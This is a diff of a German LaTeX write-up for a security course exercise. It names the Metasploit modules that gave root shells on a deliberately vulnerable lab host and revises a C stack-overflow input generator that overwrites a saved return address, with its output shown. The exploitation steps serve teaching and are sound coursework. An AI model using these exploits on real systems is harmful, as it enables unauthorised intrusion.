@@ -46,7 +46,7 @@ Port & Dienst & Exploit bekannt \\
 514 & shell & \\
 \hline
 1099 & java-rmi & \\
-\hline & 
+\hline
 2121 & ProFTPD 1.3.1 & x \\
 \hline
 3306 & MySQL 5.0.51a-3ubuntu5 & x\\
@@ -77,44 +77,44 @@ Die erste war eine Rootshell mittels des Exploits:
 exploit/unix/irc/unreal_ircd_3281_backdoor
 \end{verbatim}
 eine Rootshell zu öffnen. Der Screenshot befindet sich in Abbildung \ref{ircd_root}.
-\begin{figure}
-\includegraphics[scale=0.5]{figures/ircd_rootshell.png}
-\caption{Root shell via ircd}
-\label{ircd_root}
-\end{figure}
+%\begin{figure}
+%\includegraphics[scale=0.5]{figures/ircd_rootshell.png}
+%\caption{Root shell via ircd}
+%\label{ircd_root}
+%\end{figure}
 
 Die zweite Rootshell brachte der Exploit:
 \begin{verbatim}
 exploit/multi/misc/java_rmi_server
 \end{verbatim}
 Der Screenshot befindet sich in Abbildung \ref{java_rmi}.
-\begin{figure}
-\includegraphics[scale=0.5]{figures/java_rmi.png}
-\caption{Root shell via java\_rmi}
-\label{java_rmi}
-\end{figure}
+%\begin{figure}
+%\includegraphics[scale=0.5]{figures/java_rmi.png}
+%\caption{Root shell via java\_rmi}
+%\label{java_rmi}
+%\end{figure}
 
 Der dritte Rootshell brachte der Exploit:
 \begin{verbatim}
 exploit/unix/ftp/vsftpd_234_backdoor
 \end{verbatim}
 Der Screenshot befindet in Abbildung \ref{vsftp_234}.
-\begin{figure}
-\includegraphics[scale=0.5]{figures/vfstp.png}
-\caption{Root shell via vsftp}
-\label{vfstp_234}
-\end{figure}
+%\begin{figure}
+%\includegraphics[scale=0.5]{figures/vfstp.png}
+%\caption{Root shell via vsftp}
+%\label{vfstp_234}
+%\end{figure}
 
 Die vierte Backdoor brachte der Exploit:
 \begin{verbatim}
 exploit/multi/samba/usermap_script
 \end{verbatim}
 Der Screenshot befindet sich in Abbildung \ref{samba}.
-\begin{figure}
-\includegraphics[scale=0.5]{figures/samba.png}
-\caption{Root shell via samba}
-\label{samba}
-\end{figure}
+%\begin{figure}
+%\includegraphics[scale=0.5]{figures/samba.png}
+%\caption{Root shell via samba}
+%\label{samba}
+%\end{figure}
 
 So long, lets say: All hail to Mary!
 
@@ -212,100 +212,36 @@ int main() {
    //print the cookie variable
    printf("dbcg");
    //print some unneeded data as offset to the jump adress
-   for(i = 0; i < 39; i++){
+   for(i = 0; i < 8; i++){
       printf("%c", 0);
    }
    //print the correct adress for the jump
-   printf("%c%c%c%c", (0x4005c5 & 0xFF000000) >> 24, 0x4005c5 & 0xFF,
-            (0x4005c5 & 0xFF00) >> 8, (0x4005c5 & 0xFF0000) >> 16);
+   printf("%c%c%c%c", 0x4005c5 & 0xFF, (0x4005c5 & 0xFF00) >> 8,
+            (0x4005c5 & 0xFF0000) >> 16, (0x4005c5 & 0xFF000000) >> 24);
+   for(i = 0; i < 4; i++){
+      printf("%c", 0);
+   }
 
    return 0;
 }
 \end{verbatim}
 
+Da wir wissen, dass hinter der \texttt{cookie} Variable zuerst der \texttt{saved frame pointer} im Speicher liegt und dahinter der \texttt{Saved Instruction Pointer} liegt, überspringen wir ersteren durch beliebige Eingabe. Da wir uns im 64Bit System befinden also 8*8Bit. Dahinter setzen wir die gdb entnommene Adresse 0x4005c5 als Sprungadresse (was den \texttt{Saved Instruction Pointer} auf die printf Funktion, statt die if-Abfrage setzt).
 
-Durch Modifikation des gegebenen Programms lassen wir uns erstmal den Speicher ausgaben, der um das Array und die Variable herum liegen. Das Programm sieht nun so aus:
+Jetzt führen wir das Programm aus und erhalten die entsprechende Ausgabe:
 \begin{verbatim}
-#include <stdio.h>
-
-int main() {
-   int cookie;
-   char buf[99];
-
-   printf("buf: %08x cookie: %08x\n", &buf, &cookie);
-   for(cookie = 108; cookie < 180; cookie += 4){
-      printf("pos: %08x val: %08x vali: %i\n", buf + cookie, *((int*)(buf + cookie)),
-               *((int*)(buf + cookie)));
-   }
-   gets(buf);
-
-   if (cookie == 0x000a0d00)
-      printf("glückwunsch bernd!\n");
-}
+$ ./inputGen | ./b
+buf: 5abf4970 cookie: 5abf49dc
+glückwunsch bernd!
+Speicherzugriffsfehler (Speicherabzug geschrieben)
 \end{verbatim}
 
-Dadurch bekommen wir folgende Ausgabe:
-\begin{verbatim}
-$ ./b
-buf: ffffe7d0 cookie: ffffe83c
-pos: ffffe83c val: 0000006c vali: 108
-pos: ffffe840 val: 00000000 vali: 0
-pos: ffffe844 val: 00000000 vali: 0
-pos: ffffe848 val: f7a54b05 vali: -140162299
-pos: ffffe84c val: 00007fff vali: 32767
-pos: ffffe850 val: 00000000 vali: 0
-pos: ffffe854 val: 00000000 vali: 0
-pos: ffffe858 val: ffffe928 vali: -5848
-pos: ffffe85c val: 00007fff vali: 32767
-pos: ffffe860 val: 00000000 vali: 0
-pos: ffffe864 val: 00000001 vali: 1
-pos: ffffe868 val: 0040058d vali: 4195725
-pos: ffffe86c val: 00000000 vali: 0
-pos: ffffe870 val: 00000000 vali: 0
-pos: ffffe874 val: 00000000 vali: 0
-pos: ffffe878 val: 559b8a02 vali: 1436256770
-pos: ffffe87c val: 3fc6c3b5 vali: 1069990837
-pos: ffffe880 val: 004004a0 vali: 4195488
-\end{verbatim}
-
-Durch einen Blick in die Ausgabe von gdb können wir die Sprungadressen 0x40058d und 0x4004a0 wiedererkennen. Diese zeigen jedoch auf den Anfang bzw. noch vor unser Programm, was das Überschreiben unnütz macht.
-
-Aus diesem Grund schauen wir auch vor das Array (von 108 vor dem Array bis zum Array selbst). Hier sehen wir, dass direkt vor dem Array eine weitere Sprungadresse existiert:
-\begin{verbatim}
-$ ./b
-buf: ffffe7d0 cookie: ffffe83c
-pos: ffffe764 val: 00000000 vali: 0
-pos: ffffe768 val: ffffe840 vali: -6080
-pos: ffffe76c val: 00007fff vali: 32767
-pos: ffffe770 val: 004004a0 vali: 4195488
-pos: ffffe774 val: 00000000 vali: 0
-pos: ffffe778 val: f7df1205 vali: -136375803
-pos: ffffe77c val: 00007fff vali: 32767
-pos: ffffe780 val: 00000000 vali: 0
-pos: ffffe784 val: 00000000 vali: 0
-pos: ffffe788 val: 00000000 vali: 0
-pos: ffffe78c val: 00000000 vali: 0
-pos: ffffe790 val: ffffe83c vali: -6084
-pos: ffffe794 val: 00007fff vali: 32767
-pos: ffffe798 val: ffffe7d0 vali: -6192
-pos: ffffe79c val: 00007fff vali: 32767
-pos: ffffe7a0 val: 00400714 vali: 4196116
-pos: ffffe7a4 val: 00000000 vali: 0
-pos: ffffe7a8 val: f7dd8c80 vali: -136475520
-pos: ffffe7ac val: 00007fff vali: 32767
-pos: ffffe7b0 val: f7debd00 vali: -136397568
-pos: ffffe7b4 val: 00007fff vali: 32767
-pos: ffffe7b8 val: f7ffe130 vali: -134225616
-pos: ffffe7bc val: 00007fff vali: 32767
-pos: ffffe7c0 val: 00000001 vali: 1
-pos: ffffe7c4 val: 00000000 vali: 0
-pos: ffffe7c8 val: 004005f4 vali: 4195828
-pos: ffffe7cc val: 00000000 vali: 0
-pos: ffffe7d0 val: ffffffff vali: -1
-\end{verbatim}
-Diese kann man durch eine Eingabe in gets aber nicht überschreiben, da sie auf der anderen Seite des Speichers liegt. Hier kommen wir also ohne Modifikation (würde ich sagen) des Programms selbst nicht weiter.
+Der Speicherzugriffsfehler kommt von der weiteren Ausführung des Programms, da der Stack nicht mehr korrekte Daten besitzt bei weiteren Aufrufen.
 
 \subsection*{c)}
+
+
+
 \section*{Aufgabe 3}
 Um diese Aufgabe zu lösen haben wir das Binary \texttt{break\_it} mittels der radare GUI Bokken disassembliert. Nach etwas Code studieren fiel uns auf, dass der String "Access Denied!" nach der Sprunganweisung 
 \begin{verbatim}
